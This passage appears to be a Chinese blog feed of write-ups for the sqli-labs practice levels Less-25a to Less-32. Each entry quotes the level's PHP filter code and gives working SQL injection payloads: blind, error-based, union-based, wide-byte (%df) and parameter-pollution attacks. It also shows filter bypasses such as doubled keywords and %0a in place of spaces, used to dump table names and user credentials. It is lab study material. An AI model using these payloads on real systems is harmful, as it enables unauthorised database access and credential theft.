punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out --<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out <span class="token comment">#</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/\\\\]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out slashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>less26a过滤的东西与less26一致，闭合方式为单引号’,<br>但是<strong>没有报错的回显</strong>&amp;#x20;<br>尝试<strong>布尔盲注</strong>解决该问题</p><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26a\index.php</strong> on line <strong>36</strong></p></blockquote><p><code>1'aandnd'1'='1</code>返回正常<br><code>1'aandnd'1'='2</code>没有返回结果<br>用**单引号’**闭合 <a name="F1MU5"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><a name="MvWqA"></a></p><h2 id="判断库长"><a href="#判断库长" class="headerlink" title="判断库长"></a>判断库长</h2><p>用二分法来确定库长<br><code>1'anandd(length(database())&lt;10)||'1</code>返回正常<br><code>1'anandd(length(database())&gt;5)||'1</code>返回正常<br><code>1'anandd(length(database())=8)||'1</code>返回正常<br>数据库长度为8 <a name="u8msB"></a></p><h2 id="逐一字符判断数据库名称"><a href="#逐一字符判断数据库名称" class="headerlink" title="逐一字符判断数据库名称"></a>逐一字符判断数据库名称</h2><p><code>1'anandd(ascii(substr((database()),1,1))=115)||'1</code>返回正常,s<br>… <a name="MZkCo"></a></p><h2 id="数据表长度"><a href="#数据表长度" class="headerlink" title="数据表长度"></a>数据表长度</h2><p><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&gt;20)||'1</code>正常回显<br><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&lt;30)||'1</code>正常回显<br><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))=29)||'1</code>正常回显<br>数据表串起来长为29 <a name="TD0Ss"></a></p><h2 id="逐一字符判断数据表名称"><a href="#逐一字符判断数据表名称" class="headerlink" title="逐一字符判断数据表名称"></a>逐一字符判断数据表名称</h2><p><code>1'anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101)||'1</code>正常回显,e<br>… <a name="xiptE"></a></p><h2 id="判断列长"><a href="#判断列长" class="headerlink" title="判断列长"></a>判断列长</h2><p><code>1'anandd(length((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')))=20)||'1</code>正常回显,列长串起来是为20 <a name="Aqf5t"></a></p><h2 id="逐一字符判断字段名称"><a href="#逐一字符判断字段名称" class="headerlink" title="逐一字符判断字段名称"></a>逐一字符判断字段名称</h2><p><code>1'anandd(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')),1,1))=105)||'1</code>正常回显,i<br>… <a name="NdqVW"></a></p><h2 id="逐一字符判断字段内容"><a href="#逐一字符判断字段内容" class="headerlink" title="逐一字符判断字段内容"></a>逐一字符判断字段内容</h2><p><code>1'anandd(ascii(substr((select(group_concat(username,0x7e,passwoorrd))from(users)),1,1))=68)||'1</code>显示正常,D<br>…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less27</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out <span class="token keyword">select</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/UNION/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out UNION<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/SELECT/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out SELECT<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out Union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out <span class="token keyword">select</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新增加<strong>union,select,UNION,SELECT,Union,Select</strong>被过滤。</p><blockquote><p>空格，换行——&gt; %0a</p></blockquote><p>and，or没有被过滤。<br>针对php这种弱类型语言，可以采用<strong>部分大写部分小写绕过</strong> <strong>selEct</strong></p><blockquote><p>All Your UNTON and SELEBCT belong to US.</p></blockquote><p><strong>union和select</strong>也被过滤了。 <a name="F1rLT"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>用单引号闭合**’**</p><p><a name="l8hNe"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or'</span>爆破数据表名称<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)or'</span><span class="token number">1</span>爆破字段名<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1)or'</span><span class="token number">1</span>爆破字段内容<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct(group_concat(username,0x7e,password))from%0ausers),0x7e),1)||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less26</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/and/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out --<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out <span class="token comment">#</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces空格和换行<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/\\\\]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out slashes/<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符型注入，单引号闭合**’**</p><blockquote><p><strong>\s过滤了空格和换行，</strong><br><strong>解决and or可以双写或者用&amp;&amp;和||代替，</strong><br><strong>解决注释需要强行闭合逃逸，</strong><br><strong>需要空格的地方可以加上括号()或加号+</strong><br>and or ——&gt; &amp;&amp; ||</p><h1 id="–-——-gt-闭合逃逸"><a href="#–-——-gt-闭合逃逸" class="headerlink" title="–     ——> 闭合逃逸"></a>–     ——&gt; 闭合逃逸</h1><p>/s空格        ——&gt; 括号</p></blockquote><blockquote><p>All You Spaces and Comments belong to us.</p></blockquote><p>提示<strong>空格,and,注释</strong>被过滤 <a name="y70Tw"></a></p><h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><ol><li>单引号闭合’</li><li>网站没有对报错信息进行过滤，我们可以使用基于报错的注入手段</li></ol><p><code>1 and 1=1 --+</code></p><blockquote><p>Hint: Your Input is Filtered with following result: 11=1</p></blockquote><p>发现and,空格和注释符号被过滤掉了</p><p><a name="vzgqw"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="Kcozu"></a></p><h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'</code> <a name="Pain7"></a></p><h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1)||'</code> <a name="LKNid"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()aandnd(table_name='users'))),0x7e),1)||'</code> <a name="Clssj"></a></p><h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,passwoorrd))from(users)),0x7e),1)||'</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less25a</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less25a/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less25a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/AND/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>用or变成oorr 或 用||代替or<br>用and变成aandnd 或 用&amp;&amp;替代and<br>注：在url中&amp;&amp;还有传参的作用如果需要使用&amp;&amp;需要进行url编码</p></blockquote><p>与Less25的区别是数字型注入</p><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25a\index.php</strong> on line <strong>37</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">测试字段数<span class="token number">1</span> oorrder by <span class="token number">4</span>-- +没有第4列<span class="token number">1</span> oorrder by <span class="token number">3</span>-- +返回正常，有3个字段。检查回显点<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3-- +显示2，3是回显点爆破数据库名称<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>-- +爆破数据表<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from infoorrmation_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+爆破字段名称<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from infoorrmation_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> aandnd <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,passwoorrd<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less32</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token builtin class-name">.</span> preg_quote<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span><span class="token string">'/'</span>, <span class="token string">"<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>"</span>, <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          //escape any backslash    <span class="token variable">$string</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/\'</span>/i<span class="token string">', '</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">', $string);                               //escape single quote with a backslash    $string = preg_replace('</span>/<span class="token punctuation">\</span>"/<span class="token string">', "\\\"", $string);                                //escape double quote with a backslash              return $string;}mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='</span><span class="token variable">$id</span>' LIMIT <span class="token number">0,1</span>"<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>** 宽字节注入<strong>，利用mysql使用GBK编码,将两个字符看作一个汉字的特性，<br>消除转义符号””，使单引号成功逃逸出来。get型宽字节</strong>%df’**</p><p><a name="Oqn0G"></a></p><h1 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h1><p><code>1'</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1’<br>The Query String you input in Hex becomes : 315c27</p></blockquote><p>单引号<strong>被转义</strong>了。</p><p><code>**?id=1%df'** and 1=1--+</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1�’ and 1=1–<br>The Query String you input in Hex becomes : 31df5c2720616e6420313d312d2d20</p></blockquote><p>通过页面的回显发现确实存在宽字节注入</p><p><code>输入?id=1 and 1=2，经过站长工具检验，3120616e6420313d32就是1 and 1=2的**16进制编码**</code> <a name="lZ5eZ"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>?id=1%df' and 1=1 order by 4--+ </code></p><blockquote><p>Unknown column ‘4’ in ‘order clause’<br>没有第4列</p></blockquote><p><code>?id=1%df' and 1=1 order by 3--+ </code>正常回显<br>有3列 <a name="nkL2x"></a></p><h1 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h1><p><code>?id=1%df' and 1=2 union select 1,2,3--+</code> &amp;#x20;<br>显示2，3是回显点</p><p><a name="Fo51J"></a></p><h1 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h1><p><code>?id=1%df' and 1=2 union select 1,2,database()--+</code> <a name="mfEoD"></a></p><h1 id="爆破数据库表名称"><a href="#爆破数据库表名称" class="headerlink" title="爆破数据库表名称"></a>爆破数据库表名称</h1><p><code>?id=1%df' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code> <a name="UUMj0"></a></p><h1 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h1><p>因为’users’中单引号会被转义，因此采取十六进制代替’users’<br><strong>users的16进制是0x7573657273</strong><br><code>?id=1%df' and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code> <a name="uMeKf"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>?id=1%df' and 1=2 union select 1,2,(select group_concat(username,0x7e,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less29</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>This Site Protected byWorld’s Best Firewell<br>本网站受世界最佳防火墙保护</p></blockquote><p><code>**?id=1&amp;id=2**</code></p><blockquote><p>Your Login name:Angelina<br>Your Password:I-kill-you</p></blockquote><p>服务器端有两个部分：<br>第一部分是tomcat为引擎的jsp型服务器，<br>第二部分是apache为引擎的php服务器，<br>真正提供web服务的是php服务器,<br>往往在tomcat的服务器处做过滤处理，功能类似于waf，<br>由于解析参数的机制不同，我们可以利用该原理绕过waf的检测;<br>数据解析的顺序：tomcat从前往后， <strong>appache从后往前</strong>。\ <a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0’</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,(select database()) --+查看数据表名称?id=1&amp;id=0'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+爆破字段名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">')--+爆破字段内容 ?id=1&amp;id=0'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less28</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out UNION <span class="token operator">&amp;</span> SELECT.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>union 和 select</strong> <strong>的组合</strong>被过滤了。</p><blockquote><p>All Your’UNION’and’SIETICT’ belong to us.</p></blockquote><p>提示union和select被过滤。</p><p><code>1'</code> 现没有报错回显 